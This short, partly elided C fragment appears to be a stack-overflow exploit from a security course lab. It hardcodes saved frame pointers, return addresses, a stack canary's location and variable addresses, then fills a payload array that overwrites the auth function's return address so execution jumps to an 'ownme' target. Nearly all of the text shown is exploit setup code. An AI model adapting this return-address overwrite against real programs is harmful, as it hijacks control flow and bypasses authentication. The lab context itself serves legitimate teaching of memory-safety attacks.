...
int main(int argc, char* argv[]) {
   ...
   void *auth_bp = 0xbfffe818;     // saved ebp for auth function (done)
   void *mainloop_bp = 0xbffff048; // saved ebp for main_loop (done)
   void *auth_ra = 0x08048968;     // return address for auth (done)
   void *mainloop_ra = 0x0804e820; // return address for main_loop (done)
   //void *g_ra = 0x804893c; // return address for g (done)

   // The following refer to locations on the stack
   void *auth_user = 0xbfffe660;   // value of user variable in auth (done)
   void *auth_canary_loc = 0xbfffe7dc; // location where auth's canary is stored (done)
   void *auth_bp_loc = 0xbfffe7e8; // location of auth's saved bp (done)
   void *auth_ra_loc = 0xbfffe7ec; // location of auth's return address (done)
   void *g_authd = 0xbfffe804;     // location of authd variable of g (done)
   ...
   expl[auth_ra_user_diff/sizeof(void*)] = 
      (void*)(cur_mainloop_ra - main_ownme_diff);
